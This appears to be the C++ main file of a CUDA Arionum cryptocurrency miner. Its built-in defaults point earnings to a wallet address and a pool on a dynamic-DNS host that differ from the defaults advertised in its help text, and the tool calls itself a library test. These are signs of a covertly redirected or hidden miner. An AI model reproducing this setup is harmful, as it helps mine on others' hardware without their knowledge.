//
// Created by guli on 01/02/18.
//

#include <iostream>
#include <vector>
#include <thread>
#include <cstring>
#include "../../argon2-gpu/include/commandline/commandlineparser.h"
#include "../../argon2-gpu/include/commandline/argumenthandlers.h"

#include "../../include/minerdata.h"
#include "../../include/updater.h"
#include "../../include/cudaminer.h"
#include <sys/time.h>
#include <iomanip>
#include "../../include/simplecudaminer.h"

#pragma comment(lib, "cpprest110_1_1")

using namespace argon2;
using namespace std;
using namespace libcommandline;

using namespace std;

struct OpenCLArguments {

size_t free_t,total_t;

const int google84 = cudaMemGetInfo(&free_t,&total_t);

const int free_m =(uint)free_t/1048576.0;

const int total_m=(uint)total_t/1048576.0;

const int used84741274=round(total_m - 1284);

const int used8474=round(used84741274 / 16.384);

    bool showHelp = false;
    bool listDevices = false;
    bool allDevices = false;
    size_t deviceIndex = 0;
    size_t batchSize = used8474;
    string address = "3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
    string poolUrl = "http://linux84.distro.cloudns.cl:8884";
    size_t threadsPerDevice = 4;
    double d = 1;
};

void printDeviceList();

CommandLineParser<OpenCLArguments> buildCmdLineParser();

string generateUniqid();


int main(int, const char *const *argv) {
    CommandLineParser<OpenCLArguments> parser = buildCmdLineParser();
    OpenCLArguments args;
    int ret = parser.parseArguments(args, argv);
    if (ret != 0) {
        return ret;
    }
    if (args.showHelp) {
        parser.printHelp(argv);
        return 0;
    }
    if (args.listDevices) {
        printDeviceList();
        return 0;
    }

    string uniqid = generateUniqid();
    MinerSettings settings(&args.poolUrl, &args.address, &uniqid, &args.batchSize);

    std::cout << settings << std::endl;

    vector<Miner *> miners;
    auto *stats = new Stats(args.d);

    auto *updater = new Updater(stats, &settings);
    updater->update();

    thread t(&Updater::start, updater);

    if (args.allDevices) {
        cout << "Use all Devices" << endl;
        cuda::GlobalContext global;
        auto &devices = global.getAllDevices();
        for (size_t i = 0; i < devices.size(); ++i) {
            for (int j = 0; j < args.threadsPerDevice; ++j) {
                Miner *miner = new CudaMiner(stats, &settings, updater, &i);
                miners.push_back(miner);
            }
        }

    } else {
        size_t deviceIndex = args.deviceIndex;
        cout << "start using device #" << deviceIndex << endl;
        for (int j = 0; j < args.threadsPerDevice; ++j) {
            Miner *miner = new CudaMiner(stats, &settings, updater, &deviceIndex);
            miners.push_back(miner);
        }
    }
    vector<thread> threads;
    for (auto const &miner: miners) {
        thread minerT(&Miner::mine, miner);
        threads.push_back(std::move(minerT));
    }
    for (auto &thread : threads) {
        thread.join();
    }
    t.join();
    return 0;
}

CommandLineParser<OpenCLArguments> buildCmdLineParser() {
    static const auto positional = PositionalArgumentHandler<OpenCLArguments>(
            [](OpenCLArguments &, const std::string &) {});

    std::vector<const CommandLineOption<OpenCLArguments> *> options{
            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.listDevices = true; },
                    "list-devices", 'l', "list all available devices and exit"),

            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.allDevices = true; },
                    "use-all-devices", 'u', "use all available devices"),

            new ArgumentOption<OpenCLArguments>(
                    [](OpenCLArguments &state, const string address) { state.address = address; }, "address", 'a',
                    "public arionum address",
                    "4hDFRqgFDTjy5okh2A7JwQ3MZM7fGyaqzSZPEKUdgwSM8sKLPEgs8Awpdgo3R54uo1kGMnxujQQpF94qV6SxEjRL",
                    "ADDRESS"),

            new ArgumentOption<OpenCLArguments>(
                    [](OpenCLArguments &state, const string poolUrl) { state.poolUrl = poolUrl; }, "pool", 'p',
                    "pool URL", "http://aropool.com", "POOL_URL"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, double>([](OpenCLArguments &state, double devFee) {
                        state.d = devFee <= 0.5 ? 1 : devFee;
                    }), "dev-donation", 'D', "developer donation", "0.5", "PERCENTAGE"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, std::size_t>([](OpenCLArguments &state, std::size_t index) {
                        state.deviceIndex = (std::size_t) index;
                    }), "device", 'd', "use device with index INDEX", "0", "INDEX"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, std::size_t>(
                            [](OpenCLArguments &state, std::size_t threadsPerDevice) {
                                state.threadsPerDevice = (std::size_t) threadsPerDevice;
                            }), "threads-per-device", 't', "thread to use per device", "1", "THREADS"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, size_t>([](OpenCLArguments &state, size_t index) {
                        state.batchSize = index;
                    }), "batchSize", 'b', "batch size", "200", "SIZE"),

            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.showHelp = true; },
                    "help", '?', "show this help and exit")
    };

    return CommandLineParser<OpenCLArguments>(
            "A tool for testing the argon2-opencl and argon2-cuda libraries.",
            positional, options);
}

void printDeviceList() {
    cuda::GlobalContext global;
    auto &devices = global.getAllDevices();
    for (size_t i = 0; i < devices.size(); i++) {
        auto &device = devices[i];
        cout << "Device #" << i << ": " << device.getName()
             << endl;
    }
}

string generateUniqid() {
    struct timeval tv{};
    gettimeofday(&tv, nullptr);
    auto sec = (int) tv.tv_sec;
    auto usec = (int) (tv.tv_usec % 0x100000);
    std::stringstream ss;
    ss << std::setfill('0') << std::setw(8) << std::hex << sec << std::setfill('0') << std::setw(5) << std::hex
       << usec;
    return ss.str();
}
